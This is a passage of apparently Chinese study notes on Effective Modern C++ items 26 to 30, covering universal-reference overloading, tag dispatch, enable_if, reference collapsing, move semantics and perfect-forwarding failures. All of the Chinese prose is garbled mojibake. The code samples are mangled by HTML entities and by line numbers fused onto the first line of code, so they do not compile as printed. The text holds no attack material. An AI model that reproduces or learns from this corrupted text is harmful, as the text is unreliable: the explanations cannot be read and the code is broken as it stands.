å‡½æ•°ï¼Œè°ƒç”¨åŸºç±»çš„ : Person(std::move(rhs)) //åŸºç±»çš„å®Œç¾è½¬å‘æ„é€ å‡½æ•°ï¼ &#123; â€¦ &#125;&#125;; æ´¾ç”Ÿç±»çš„æ‹·è´å’Œç§»åŠ¨æ„é€ å‡½æ•°æ²¡æœ‰è°ƒç”¨åŸºç±»çš„æ‹·è´å’Œç§»åŠ¨æ„é€ å‡½æ•°ï¼Œè€Œæ˜¯è°ƒç”¨äº†åŸºç±»çš„å®Œç¾è½¬å‘æ„é€ å‡½æ•°ã€‚ æ´¾ç”Ÿç±»å°†SpecialPersonç±»å‹çš„å®å‚ä¼ é€’ç»™å…¶åŸºç±»ï¼Œç„¶åé€šè¿‡æ¨¡æ¿å®ä¾‹åŒ–å’Œé‡è½½è§£æè§„åˆ™ä½œç”¨äºåŸºç±»Personã€‚æœ€ç»ˆï¼Œä»£ç æ— æ³•ç¼–è¯‘ï¼Œå› ä¸ºstd::stringæ²¡æœ‰æ¥å—ä¸€ä¸ªSpecialPersonçš„æ„é€ å‡½æ•°ï¼ˆåªæœ‰å®Œç¾è½¬å‘æ„é€ å‡½æ•°åˆå§‹åŒ–äº† name ï¼‰ã€‚ ç»“è®º å¯¹é€šç”¨å¼•ç”¨å½¢å‚çš„å‡½æ•°è¿›è¡Œé‡è½½æ—¶ï¼Œé€šç”¨å¼•ç”¨å‡½æ•°å¯åŒ¹é…çš„ç±»å‹ï¼Œå‡ ä¹æ€»ä¼šæ¯”ä½ æœŸæœ›çš„å¤šå¾—å¤šã€‚ å®Œç¾è½¬å‘æ„é€ å‡½æ•°æ˜¯ç³Ÿç³•çš„å®ç°ï¼Œå› ä¸ºå¯¹äºnon-constå·¦å€¼ï¼Œå®ƒä»¬ä¼šä¼˜å…ˆäºæ‹·è´æ„é€ å‡½æ•°åŒ¹é…ï¼Œè€Œä¸”ä¼šåŠ«æŒæ´¾ç”Ÿç±»å¯¹äºåŸºç±»çš„æ‹·è´å’Œç§»åŠ¨æ„é€ å‡½æ•°çš„è°ƒç”¨ã€‚ 27 é€šç”¨å¼•ç”¨é‡è½½çš„æ›¿ä»£æ–¹æ³• ä¸€ä¸ªç›´æ¥çš„æ€è·¯ï¼Œæ”¾å¼ƒé‡è½½ï¼Œå¦å¤–å£°æ˜ä¸€ä¸ªå‡½æ•°ç­¾åã€‚ å¦ä¸€ç§æ€è·¯ï¼Œæ”¾å¼ƒé‡è½½ï¼Œä½†æ˜¯ä½¿ç”¨ lvalue-refrence-to-const çš„æ–¹å¼ï¼Œå‚æ•°ç±»å‹å˜ä¸º const T&amp;ã€‚ æ”¾å¼ƒé‡è½½çš„å¦ä¸€ç§æ€è·¯æ˜¯ï¼Œç›´æ¥ä¼ å€¼ + std::movï¼Œçš„æ–¹å¼ã€‚ å¦å¤–ä¸¤ç§æ–¹æ¡ˆï¼Œä¿ç•™äº†é‡è½½ï¼Œä½†æ˜¯éƒ½æœ‰å±€é™ï¼Œæ•ˆç‡æ›´é«˜ä½†æ˜¯å¹¶ä¸æ˜¯ä¸‡èƒ½çš„ã€‚è¿™ä¸¤ç§æ–¹æ¡ˆæ˜¯ï¼štag dispatch å’Œ enable_if çº¦æŸæ¨¡æ¿ã€‚ tag dispath å®ç°å½¢å¼ï¼š 12345678910template&lt;typename T&gt;void logAndAdd(T&amp;&amp; name)&#123; logAndAddImpl( std::forward&lt;T&gt;(name), std::is_integral&lt;typename std::remove_reference&lt;T&gt;::type&gt;() // C++14 // std::is_integral&lt;std::remove_reference&lt;T&gt;&gt;() );&#125; åŸæ¥å‡½æ•°æ¨¡æ¿ä¸å˜ï¼Œä½†æ˜¯å°†å®é™…çš„å‡½æ•°è°ƒç”¨ï¼Œè¿›è¡Œäº†åˆ†å‘ï¼ˆdispatchï¼‰ã€‚ ä¹‹æ‰€ä»¥ remove_referenceï¼Œæ˜¯å› ä¸º T å¯èƒ½è¢«æ¨å¯¼ä¸ºå·¦å€¼ T&amp;ï¼Œè¿™ä¸æ˜¯ type trait std::is_integral è¯†åˆ«ä¸ºçœŸçš„ç±»å‹ã€‚ åˆ†å‘å®ç°ä¸ºï¼š 12345678910111213template&lt;typename T&gt; //éæ•´å‹å®å‚ï¼šæ·»åŠ åˆ°å…¨å±€æ•°æ®ç»“æ„ä¸­void logAndAddImpl(T&amp;&amp; name, std::false_type) &#123; auto now = std::chrono::system_clock::now(); log(now, \"logAndAdd\"); names.emplace(std::forward&lt;T&gt;(name));&#125;std::string nameFromIdx(int idx); // æ•´å‹å®å‚ï¼šæŸ¥æ‰¾åå­—å¹¶ç”¨å®ƒè°ƒç”¨logAndAddvoid logAndAddImpl(int idx, std::true_type) &#123; logAndAdd(nameFromIdx(idx)); &#125; è¿™é‡Œçš„ std::false_type å’Œ std::true_type ï¼Œæ˜¯ T åˆ†åˆ«åœ¨ä¸æ»¡è¶³ std::is_integralå’Œæ»¡è¶³ std::is_integral çš„æƒ…å†µä¸‹çš„çˆ¶ç±»ã€‚ enable_if çº¦æŸæ¨¡æ¿ tag dispath å¹¶ä¸èƒ½è§£å†³çˆ¶ç±»çš„é€šç”¨å¼•ç”¨é‡è½½å‡½æ•°çš„é—®é¢˜ï¼ˆè§ä¸Šä¸€æ¡æ¬¾ 26ï¼‰ã€‚ enable_if çº¦æŸæ¨¡æ¿ï¼ŒåŸºäºä»¥ä¸‹æœºåˆ¶ï¼š é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰æ¨¡æ¿æ˜¯å¯ç”¨çš„ï¼ˆenabledï¼‰ï¼Œä½†æ˜¯ä½¿ç”¨std::enable_ifå¯ä»¥ä½¿å¾—ä»…åœ¨std::enable_ifæŒ‡å®šçš„æ¡ä»¶æ»¡è¶³æ—¶æ¨¡æ¿æ‰å¯ç”¨ã€‚ä¸æ»¡è¶³æ¡ä»¶ï¼Œæ¨¡æ¿å°±æ˜¯è¢«ç¦æ­¢ï¼ˆdisabledï¼‰çš„ã€‚ é¦–å…ˆè§£å†³ä¼ å…¥ Person ç±»å¯¹è±¡ï¼Œå¯¼è‡´é€šç”¨å¼•ç”¨é‡è½½ä¸­ï¼Œstring ç”¨ Person å¯¹è±¡åˆå§‹åŒ–æŠ¥é”™çš„é—®é¢˜ï¼š 123456789101112131415// C++11class Person &#123;public: template&lt; typename T, typename = typename std::enable_if&lt; // !std::is_base_of&lt;Person, !std::is_base_of&lt;Person, typename std::decay&lt;T&gt;::type &gt;::value &gt;::type &gt; explicit Person(T&amp;&amp; n); â€¦&#125;; ä½¿ç”¨ type trait is_same ï¼Œå¯ä»¥åœ¨ä¼ å…¥ Person å¯¹è±¡æ—¶ï¼Œç¦ç”¨æ¨¡æ¿ã€‚ä½†æ˜¯ï¼Œä¼ å…¥å­ç±»å¯¹è±¡ï¼ŒåŒæ ·æ—¶ä¸å…è®¸çš„ï¼Œæ‰€ä»¥ä½¿ç”¨äº† std::is_base_ofã€‚ std::decay&lt;T&gt; å»æ‰äº†å¯¹äºTçš„å¼•ç”¨ï¼Œconstï¼Œvolatileä¿®é¥°ã€‚ å†ç»“åˆå¯¹ä¼ å…¥ int ç±»å‹å‚æ•°çš„é™åˆ¶ï¼Œå¯ä»¥çš„å¾—åˆ°ä¸‹é¢çš„ä»£ç ï¼š 123456789101112131415161718192021222324252627282930class Person &#123;public: template&lt; typename T, typename = std::enable_if_t&lt; !std::is_base_of&lt;Person, std::decay_t&lt;T&gt;&gt;::value &amp;&amp; !std::is_integral&lt;std::remove_reference_t&lt;T&gt;&gt;::value &gt; &gt; explicit Person(T&amp;&amp; n) : name(std::forward&lt;T&gt;(n)) //std::stringsçš„å®å‚çš„æ„é€ å‡½æ•° &#123; //æ–­è¨€å¯ä»¥ç”¨Tå¯¹è±¡åˆ›å»ºstd::string static_assert( std::is_constructible&lt;std::string, T&gt;::value, \"Parameter n can't be used to construct a std::string\" ); ... &#125; explicit Person(int idx) //æ•´å‹å®å‚çš„æ„é€ å‡½æ•° : name(nameFromIdx(idx)) &#123; â€¦ &#125; â€¦ //æ‹·è´ã€ç§»åŠ¨æ„é€ å‡½æ•°ç­‰private: std::string name;&#125;; å…¶ä¸­ï¼š 12template&lt; bool B, class T = void &gt;using enable_if_t = typename enable_if&lt;B,T&gt;::type; // (since C++14) è¿™é‡Œçš„ static_assert æ–­è¨€è™½ç„¶å¯ä»¥è¯†åˆ«ï¼ŒT ç±»å‹æ˜¯å¦å¯ä»¥æ„å»º stringï¼Œä½†æ˜¯è¿™å‘ç”Ÿåœ¨ name(std::forward&lt;T&gt;(n)) ä¹‹åã€‚æ‰€ä»¥ï¼ŒæŠ¥é”™å…ˆäºæ–­è¨€ã€‚ ç»“è®º é€šç”¨å¼•ç”¨é‡è½½çš„æ›¿ä»£æ–¹æ³•ï¼šä½¿ç”¨ä¸åŒçš„å‡½æ•°åï¼Œé€šè¿‡lvalue-reference-to-constä¼ é€’å½¢å‚ï¼ŒæŒ‰å€¼ä¼ é€’å½¢å‚ï¼Œä½¿ç”¨tag dispatchï¼Œä½¿ç”¨ enable_if çº¦æŸæ¨¡æ¿ã€‚ é€šç”¨å¼•ç”¨å‚æ•°é€šå¸¸å…·æœ‰é«˜æ•ˆç‡çš„ä¼˜åŠ¿ï¼Œä½†æ˜¯å…¶ä½¿ç”¨éœ€è¦ä»”ç»†åˆ†æã€‚ 28 å¼•ç”¨æŠ˜å  ç›®çš„å°±æ˜¯ç¦æ­¢ä½ ç”Ÿæˆå¼•ç”¨çš„å¼•ç”¨ã€‚ å­˜åœ¨ä¸¤ç§ç±»å‹çš„å¼•ç”¨ï¼ˆå·¦å€¼å’Œå³å€¼ï¼‰ï¼Œæ‰€ä»¥æœ‰å››ç§å¯èƒ½çš„å¼•ç”¨ç»„åˆï¼ˆå·¦å€¼çš„å·¦å€¼ï¼Œå·¦å€¼çš„å³å€¼ï¼Œå³å€¼çš„å³å€¼ï¼Œå³å€¼çš„å·¦å€¼ï¼‰ã€‚ è¿™äº›ç»„åˆçš„çš„ç»“æœï¼šå¦‚æœä¸¤ä¸ªä¸­ä»»ä¸€å¼•ç”¨ä¸ºå·¦å€¼å¼•ç”¨ï¼Œåˆ™ç»“æœä¸ºå·¦å€¼å¼•ç”¨ã€‚å¦åˆ™ï¼ˆå³ï¼Œå¦‚æœå¼•ç”¨éƒ½æ˜¯å³å€¼å¼•ç”¨ï¼‰ï¼Œç»“æœä¸ºå³å€¼å¼•ç”¨ã€‚ ç»„åˆ ç»“æœ å·¦å€¼çš„å³å€¼ å·¦å€¼ å·¦å€¼çš„å·¦å€¼ å·¦å€¼ å³å€¼çš„å·¦å€¼ å·¦å€¼ å³å€¼çš„å³å€¼ å³å€¼ std::forwordå®ç° std::forwardåº”ç”¨åœ¨é€šç”¨å¼•ç”¨å‚æ•°ä¸Šï¼Œæ‰€ä»¥ç»å¸¸èƒ½çœ‹åˆ°è¿™æ ·ä½¿ç”¨ï¼š 123456template&lt;typename T&gt;void f(T&amp;&amp; fParam)&#123; â€¦ //åšäº›å·¥ä½œ someFunc(std::forward&lt;T&gt;(fParam)); //è½¬å‘fParamåˆ°someFunc&#125; å› ä¸ºfParamæ˜¯é€šç”¨å¼•ç”¨ï¼Œç±»å‹å‚æ•°Tçš„ç±»å‹æ ¹æ®fè¢«ä¼ å…¥å®å‚ï¼ˆå³ç”¨æ¥å®ä¾‹åŒ–fParamçš„è¡¨è¾¾å¼ï¼‰æ˜¯å·¦å€¼è¿˜æ˜¯å³å€¼æ¥å†³å®šã€‚ std::forwardçš„ä½œç”¨æ˜¯å½“ä¸”ä»…å½“ä¼ ç»™fçš„å®å‚ä¸ºå³å€¼æ—¶ï¼ˆæ­¤æ—¶Tä¸ºéå¼•ç”¨ç±»å‹ï¼‰ï¼Œæ‰å°†fParamè½¬åŒ–ä¸ºä¸€ä¸ªå³å€¼ã€‚ std::forwardå¯ä»¥è¿™æ ·å®ç°ï¼š 12345template&lt;typename T&gt; //åœ¨stdå‘½åç©ºé—´T&amp;&amp; forward(typename remove_reference&lt;T&gt;::type&amp; param)&#123; return static_cast&lt;T&amp;&amp;&gt;(param);&#125; åœ¨C++14ä¸­ï¼Œstd::remove_reference_tçš„å­˜åœ¨ä½¿å¾—å®ç°å˜å¾—æ›´ç®€æ´ï¼š 12345template&lt;typename T&gt; //C++14ï¼›ä»ç„¶åœ¨stdå‘½åç©ºé—´T&amp;&amp; forward(remove_reference_t&lt;T&gt;&amp; param)&#123; return static_cast&lt;T&amp;&amp;&gt;(param);&#125; å‡è®¾ä¼ å…¥åˆ°fçš„å®å‚æ˜¯Widgetçš„å·¦å€¼ç±»å‹ã€‚Tè¢«æ¨å¯¼ä¸ºWidget&amp;ï¼Œç„¶åè°ƒç”¨std::forwardå°†å®ä¾‹åŒ–ä¸ºstd::forward&lt;Widget&amp;&gt;ã€‚ Widget&amp;å¸¦å…¥åˆ°ä¸Šé¢çš„std::forwardçš„å®ç°ä¸­ï¼š 123Widget&amp; &amp;&amp; forward(typename remove_reference&lt;Widget&amp;&gt;::type&amp; param)&#123; return static_cast&lt;Widget&amp; &amp;&amp;&gt;(param); &#125; std::remove_reference&lt;Widget&amp;&gt;::typeè¿™ä¸ªtype traitäº§ç”ŸWidget ï¼Œæ‰€ä»¥std::forwardæˆä¸ºï¼š 12Widget&amp; &amp;&amp; forward(Widget&amp; param)&#123; return static_cast&lt;Widget&amp; &amp;&amp;&gt;(param); &#125; æ ¹æ®å¼•ç”¨æŠ˜å è§„åˆ™ï¼Œè¿”å›å€¼å’Œå¼ºåˆ¶è½¬æ¢å¯ä»¥åŒ–ç®€ï¼Œæœ€ç»ˆç‰ˆæœ¬çš„std::forwardè°ƒç”¨å°±æ˜¯ï¼š 12Widget&amp; forward(Widget&amp; param)&#123; return static_cast&lt;Widget&amp;&gt;(param); &#125; å½“å·¦å€¼å®å‚è¢«ä¼ å…¥åˆ°å‡½æ•°æ¨¡æ¿fæ—¶ï¼Œstd::forwardè¢«å®ä¾‹åŒ–ä¸ºæ¥å—å’Œè¿”å›å·¦å€¼å¼•ç”¨ã€‚ å¦‚æœä¼ å…¥å³å€¼ï¼Œé‚£ä¹ˆç»“æœä¼šæ˜¯è¿™æ ·ï¼š 12Widget&amp;&amp; forward(Widget&amp; param)&#123; return static_cast&lt;Widget&amp;&amp;&gt;(param); &#125; auto åœ¨autoçš„å†™æ³•ä¸­ï¼Œè§„åˆ™æ˜¯ç±»ä¼¼çš„ã€‚å£°æ˜ 1auto&amp;&amp; w1 = w; ç”¨ä¸€ä¸ªå·¦å€¼åˆå§‹åŒ–w1ï¼Œå› æ­¤ä¸ºautoæ¨å¯¼å‡ºç±»å‹Widget&amp;ã€‚æŠŠWidget&amp;ä»£å›w1å£°æ˜ä¸­çš„autoé‡Œï¼Œäº§ç”Ÿäº†å¼•ç”¨çš„å¼•ç”¨ï¼Œ 1Widget&amp; &amp;&amp; w1 = w; åº”ç”¨å¼•ç”¨æŠ˜å è§„åˆ™ï¼Œå°±æ˜¯ 1Widget&amp; w1 = w ç»“æœå°±æ˜¯w1æ˜¯ä¸€ä¸ªå·¦å€¼å¼•ç”¨ã€‚ ä¸‹é¢è¿™ä¸ªå£°æ˜ï¼Œ 1auto&amp;&amp; w2 = widgetFactory(); ä½¿ç”¨å³å€¼åˆå§‹åŒ–w2ï¼Œä¸ºautoæ¨å¯¼å‡ºéå¼•ç”¨ç±»å‹Widgetã€‚æŠŠWidgetä»£å…¥autoå¾—åˆ°ï¼š 1Widget&amp;&amp; w2 = widgetFactory() æ²¡æœ‰å¼•ç”¨çš„å¼•ç”¨ï¼Œè¿™å°±æ˜¯æœ€ç»ˆç»“æœï¼Œw2æ˜¯ä¸ªå³å€¼å¼•ç”¨ã€‚ é€šç”¨å¼•ç”¨ é€šç”¨å¼•ç”¨ä¸æ˜¯ä¸€ç§æ–°çš„å¼•ç”¨ï¼Œå®ƒå®é™…ä¸Šæ˜¯æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ä¸‹çš„å³å€¼å¼•ç”¨ï¼š ç±»å‹æ¨å¯¼åŒºåˆ†å·¦å€¼å’Œå³å€¼ã€‚Tç±»å‹çš„å·¦å€¼è¢«æ¨å¯¼ä¸ºT&amp;ç±»å‹ï¼ŒTç±»å‹çš„å³å€¼è¢«æ¨å¯¼ä¸ºTã€‚ å‘ç”Ÿå¼•ç”¨æŠ˜å ã€‚ ç»“è®º å¼•ç”¨æŠ˜å å‘ç”Ÿåœ¨å››ç§æƒ…å†µä¸‹ï¼šæ¨¡æ¿å®ä¾‹åŒ–ï¼Œautoç±»å‹æ¨å¯¼ï¼Œtypedefä¸åˆ«åå£°æ˜çš„åˆ›å»ºå’Œä½¿ç”¨ï¼Œdecltypeã€‚ å½“ç¼–è¯‘å™¨åœ¨å¼•ç”¨æŠ˜å ç¯å¢ƒä¸­ç”Ÿæˆäº†å¼•ç”¨çš„å¼•ç”¨æ—¶ï¼Œç»“æœå°±æ˜¯å•ä¸ªå¼•ç”¨ã€‚å¸¦æœ‰å·¦å€¼å¼•ç”¨çš„å¼•ç”¨æŠ˜å ï¼Œç»“æœå°±æ˜¯å·¦å€¼å¼•ç”¨ã€‚å¦åˆ™å°±æ˜¯å³å€¼å¼•ç”¨ã€‚ é€šç”¨å¼•ç”¨å°±æ˜¯å¼•ç”¨æŠ˜å çš„ç»“æœã€‚ 29 ç§»åŠ¨æ“ä½œçš„ç¼ºç‚¹ å‡çº§C++11ä¹‹å‰çš„ä»£ç  C++11å€¾å‘äºä¸ºç¼ºå°‘ç§»åŠ¨æ“ä½œçš„ç±»ç”Ÿæˆå®ƒä»¬ï¼Œä½†æ˜¯åªæœ‰åœ¨æ²¡æœ‰å£°æ˜å¤åˆ¶æ“ä½œï¼Œç§»åŠ¨æ“ä½œï¼Œææ„å‡½æ•°çš„ç±»ä¸­æ‰ä¼šç”Ÿæˆç§»åŠ¨æ“ä½œã€‚ å¦å¤–æ•°æ®æˆå‘˜æˆ–è€…æŸç±»å‹çš„åŸºç±»ç¦æ­¢ç§»åŠ¨æ“ä½œï¼Œç¼–è¯‘å™¨ä¸ç”Ÿæˆç§»åŠ¨æ“ä½œçš„æ”¯æŒã€‚ æ‰€ä»¥ï¼Œå¯¹äºæ²¡æœ‰æ˜ç¡®æ”¯æŒç§»åŠ¨æ“ä½œçš„ç±»å‹ï¼Œå¹¶ä¸”ä¸ç¬¦åˆç¼–è¯‘å™¨é»˜è®¤ç”Ÿæˆçš„æ¡ä»¶çš„ç±»ï¼Œæ²¡æœ‰ç†ç”±æœŸæœ›C++11ä¼šæ¯”C++98è¿›è¡Œä»»ä½•æ€§èƒ½ä¸Šçš„æå‡ã€‚ ç§»åŠ¨å¤§å¯¹è±¡ 1234567std::vector&lt;Widget&gt; vm1;//æŠŠæ•°æ®å­˜è¿›vw1â€¦//æŠŠvw1ç§»åŠ¨åˆ°vw2ã€‚ä»¥å¸¸æ•°æ—¶é—´è¿è¡Œã€‚åªæœ‰vw1å’Œvw2ä¸­çš„æŒ‡é’ˆè¢«æ”¹å˜auto vm2 = std::move(vm1); std::arrayæ²¡æœ‰è¿™ç§æŒ‡é’ˆå®ç°ï¼Œæ•°æ®å°±ä¿å­˜åœ¨std::arrayå¯¹è±¡ä¸­ï¼š 1234567std::array&lt;Widget, 10000&gt; aw1;//æŠŠæ•°æ®å­˜è¿›aw1â€¦//æŠŠaw1ç§»åŠ¨åˆ°aw2ã€‚ä»¥çº¿æ€§æ—¶é—´è¿è¡Œã€‚aw1ä¸­æ‰€æœ‰å…ƒç´ è¢«ç§»åŠ¨åˆ°aw2auto aw2 = std::move(aw1); ç§»åŠ¨è¿˜æ˜¯éå†äº†æ‰€æœ‰å…ƒç´ ã€‚ ç§»åŠ¨å°å­—ç¬¦ä¸² std::stringæä¾›äº†å¸¸æ•°æ—¶é—´çš„ç§»åŠ¨æ“ä½œå’Œçº¿æ€§æ—¶é—´çš„å¤åˆ¶æ“ä½œã€‚ è®¸å¤šå­—ç¬¦ä¸²çš„å®ç°é‡‡ç”¨äº†å°å­—ç¬¦ä¸²ä¼˜åŒ–ï¼ˆsmall string optimizationï¼ŒSSOï¼‰ã€‚â€œå°â€å­—ç¬¦ä¸²ï¼ˆæ¯”å¦‚é•¿åº¦å°äº15ä¸ªå­—ç¬¦çš„ï¼‰å­˜å‚¨åœ¨äº†std::stringçš„ç¼“å†²åŒºä¸­ï¼Œå¹¶æ²¡æœ‰å­˜å‚¨åœ¨å †å†…å­˜ï¼Œç§»åŠ¨è¿™ç§å­˜å‚¨çš„å­—ç¬¦ä¸²å¹¶ä¸æ¯”å¤åˆ¶æ“ä½œæ›´å¿«ï¼ˆå¹¶ä¸ä¼šæ‰§è¡ŒæŒ‡é’ˆçš„å¤åˆ¶ï¼Œè€Œæ˜¯å°†å­—ç¬¦ä¸²å®Œå…¨ä»ä¸€ä¸ªä½ç½®æ‹·è´åˆ°å¦ä¸€ä¸ªä½ç½®ï¼Œå†æ¸…ç©ºåŸæ¥çš„å†…å­˜ï¼‰ã€‚ ç»“è®º C++11çš„ç§»åŠ¨è¯­ä¹‰å¹¶æ— ä¼˜åŠ¿ï¼š æ²¡æœ‰ç§»åŠ¨æ“ä½œï¼šè¦ç§»åŠ¨çš„å¯¹è±¡æ²¡æœ‰æä¾›ç§»åŠ¨æ“ä½œï¼Œæ‰€ä»¥ç§»åŠ¨çš„å†™æ³•ä¹Ÿä¼šå˜æˆå¤åˆ¶æ“ä½œã€‚ ç§»åŠ¨ä¸ä¼šæ›´å¿«ï¼šè¦ç§»åŠ¨çš„å¯¹è±¡æä¾›çš„ç§»åŠ¨æ“ä½œå¹¶ä¸æ¯”å¤åˆ¶é€Ÿåº¦æ›´å¿«ã€‚ ç§»åŠ¨ä¸å¯ç”¨ï¼šè¿›è¡Œç§»åŠ¨çš„ä¸Šä¸‹æ–‡è¦æ±‚ç§»åŠ¨æ“ä½œä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œä½†æ˜¯è¯¥æ“ä½œæ²¡æœ‰è¢«å£°æ˜ä¸ºnoexceptã€‚ æºå¯¹è±¡æ˜¯å·¦å€¼ï¼šé™¤äº†æå°‘æ•°çš„æƒ…å†µå¤–ï¼Œåªæœ‰å³å€¼å¯ä»¥ä½œä¸ºç§»åŠ¨æ“ä½œçš„æ¥æºã€‚ 30 å®Œç¾è½¬å‘å¤±è´¥çš„æƒ…å†µ å®Œç¾è½¬å‘ï¼ˆperfect forwardingï¼‰æ„å‘³ç€æˆ‘ä»¬ä¸ä»…è½¬å‘å¯¹è±¡ï¼Œæˆ‘ä»¬è¿˜è½¬å‘æ˜¾è‘—çš„ç‰¹å¾ï¼šå®ƒä»¬çš„ç±»å‹ï¼Œæ˜¯å·¦å€¼è¿˜æ˜¯å³å€¼ï¼Œæ˜¯constè¿˜æ˜¯volatileã€‚ æœ‰ä»¥ä¸‹å‡½æ•°ï¼š 12345template&lt;typename... Ts&gt;void fwd(Ts&amp;&amp;... params) //æ¥å—ä»»ä½•å®å‚&#123; f(std::forward&lt;Ts&gt;(params)...); //è½¬å‘ç»™f&#125; è®¨è®ºä¸‹é¢å‡½æ•°è°ƒç”¨å¤±è´¥çš„æƒ…å†µï¼š 12f( expression ); //è°ƒç”¨fæ‰§è¡ŒæŸä¸ªæ“ä½œfwd( expression ); //ä½†è°ƒç”¨fwdæ‰§è¡Œå¦ä¸€ä¸ªæ“ä½œï¼Œåˆ™fwdä¸èƒ½å®Œç¾è½¬å‘expressionç»™f èŠ±æ‹¬å·åˆå§‹åŒ–å™¨ å‡å®šfè¿™æ ·å£°æ˜ï¼š 1void f(const std::vector&lt;int&gt;&amp; v); åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç”¨èŠ±æ‹¬å·åˆå§‹åŒ–è°ƒç”¨fé€šè¿‡ç¼–è¯‘ï¼Œ 1f(&#123; 1, 2, 3 &#125;); //å¯ä»¥ï¼Œâ€œ&#123;1, 2, 3&#125;â€éšå¼è½¬æ¢ä¸ºstd::vector&lt;int&gt; ä½†æ˜¯ä¼ é€’ç›¸åŒçš„åˆ—è¡¨åˆå§‹åŒ–ç»™fwdä¸èƒ½ç¼–è¯‘ 1fwd(&#123; 1, 2, 3 &#125;); //é”™è¯¯ï¼ä¸èƒ½ç¼–è¯‘ å½“é€šè¿‡è°ƒç”¨å‡½æ•°æ¨¡æ¿fwdé—´æ¥è°ƒç”¨fæ—¶ï¼Œç¼–è¯‘å™¨ä¸å†æŠŠè°ƒç”¨åœ°ä¼ å…¥ç»™fwdçš„å®å‚å’Œfçš„å£°æ˜ä¸­å½¢å‚ç±»å‹è¿›è¡Œæ¯”è¾ƒã€‚ è€Œæ˜¯æ¨å¯¼ä¼ å…¥ç»™fwdçš„å®å‚ç±»å‹ï¼Œç„¶åæ¯”è¾ƒæ¨å¯¼åçš„å®å‚ç±»å‹å’Œfçš„å½¢å‚å£°æ˜ç±»å‹ã€‚ ç¼–è¯‘å™¨ä¸å…è®¸åœ¨å¯¹fwdçš„è°ƒç”¨ä¸­æ¨å¯¼è¡¨è¾¾å¼{ 1, 2, 3 }çš„ç±»å‹ï¼Œå› ä¸ºfwdçš„å½¢å‚æ²¡æœ‰å£°æ˜ä¸ºstd::initializer_listã€‚å¯¹äºfwdå½¢å‚çš„æ¨å¯¼ç±»å‹è¢«é˜»æ­¢ï¼Œç¼–è¯‘å™¨åªèƒ½æ‹’ç»è¯¥è°ƒç”¨ã€‚ ä½†æ˜¯ï¼Œä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–çš„autoçš„å˜é‡çš„ç±»å‹æ¨å¯¼æ˜¯æˆåŠŸçš„ã€‚è¿™ç§å˜é‡è¢«è§†ä¸ºstd::initializer_listå¯¹è±¡ï¼Œåœ¨è½¬å‘å‡½æ•°åº”æ¨å¯¼å‡ºç±»å‹ä¸ºstd::initializer_listçš„æƒ…å†µï¼Œè¿™æä¾›äº†ä¸€ç§ç®€å•çš„è§£å†³æ–¹æ³•â€”â€”ä½¿ç”¨autoå£°æ˜ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œç„¶åå°†å±€éƒ¨å˜é‡ä¼ è¿›è½¬å‘å‡½æ•°ï¼š 12auto il = &#123; 1, 2, 3 &#125;; //ilçš„ç±»å‹è¢«æ¨å¯¼ä¸ºstd::initializer_list&lt;int&gt;fwd(il); //å¯ä»¥ï¼Œå®Œç¾è½¬å‘ilç»™f 0æˆ–è€…NULL å½“ä½ è¯•å›¾ä¼ é€’0æˆ–è€…NULLä½œä¸ºç©ºæŒ‡é’ˆç»™æ¨¡æ¿æ—¶ï¼Œç±»å‹æ¨å¯¼ä¼šå‡ºé”™ï¼Œä¼šæŠŠä¼ æ¥çš„å®å‚æ¨å¯¼ä¸ºä¸€ä¸ªæ•´å‹ç±»å‹ï¼ˆå…¸å‹æƒ…å†µä¸ºintï¼‰è€Œä¸æ˜¯æŒ‡é’ˆç±»å‹ã€‚ç»“æœå°±æ˜¯ä¸ç®¡æ˜¯0è¿˜æ˜¯NULLéƒ½ä¸èƒ½ä½œä¸ºç©ºæŒ‡é’ˆè¢«å®Œç¾è½¬å‘ã€‚è§£å†³æ–¹æ³•éå¸¸ç®€å•ï¼Œä¼ ä¸€ä¸ªnullptrè€Œä¸æ˜¯0æˆ–è€…NULLã€‚ åªæœ‰å£°æ˜çš„ static const æ•°æ®æˆå‘˜ ä¸‹é¢çš„ä»£ç ï¼š 123456789class Widget &#123;public: static const std::size_t MinVals = 28; //MinValçš„å£°æ˜ â€¦&#125;;â€¦ //æ²¡æœ‰MinValså®šä¹‰std::vector&lt;int&gt; widgetData;widgetData.reserve(Widget::MinVals); //ä½¿ç”¨MinVals ä½¿ç”¨MinValsè°ƒç”¨fæ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºç¼–è¯‘å™¨ç›´æ¥å°†å€¼28ä»£æ›¿MinValsï¼š 1f(Widget::MinVals); //å¯ä»¥ï¼Œè§†ä¸ºâ€œf(28)â€ ä¸è¿‡å¦‚æœæˆ‘ä»¬å°è¯•é€šè¿‡fwdè°ƒç”¨fï¼Œäº‹æƒ…ä¸ä¼šè¿›å±•é‚£ä¹ˆé¡ºåˆ©ï¼š 1fwd(Widget::MinVals); //é”™è¯¯ï¼ ä»£ç å¯ä»¥ç¼–è¯‘ï¼Œä½†æ˜¯ä¸åº”è¯¥é“¾æ¥ã€‚ å°½ç®¡ä»£ç ä¸­æ²¡æœ‰ä½¿ç”¨MinValsçš„åœ°å€ï¼Œä½†æ˜¯fwdçš„å½¢å‚æ˜¯é€šç”¨å¼•ç”¨ã€‚ è€Œå¼•ç”¨ï¼Œåœ¨ç¼–è¯‘å™¨ç”Ÿæˆçš„ä»£ç ä¸­ï¼Œé€šå¸¸è¢«è§†ä½œæŒ‡é’ˆã€‚ åœ¨ç¨‹åºçš„äºŒè¿›åˆ¶åº•å±‚ä»£ç ä¸­ï¼ˆä»¥åŠç¡¬ä»¶ä¸­ï¼‰æŒ‡é’ˆå’Œå¼•ç”¨æ˜¯ä¸€æ ·çš„ã€‚åœ¨è¿™ä¸ªæ°´å¹³ä¸Šï¼Œå¼•ç”¨åªæ˜¯å¯ä»¥è‡ªåŠ¨è§£å¼•ç”¨çš„æŒ‡é’ˆã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé€šè¿‡å¼•ç”¨ä¼ é€’MinValså®é™…ä¸Šä¸é€šè¿‡æŒ‡é’ˆä¼ é€’MinValsæ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤ï¼Œå¿…é¡»æœ‰å†…å­˜ä½¿å¾—æŒ‡é’ˆå¯ä»¥æŒ‡å‘ã€‚ 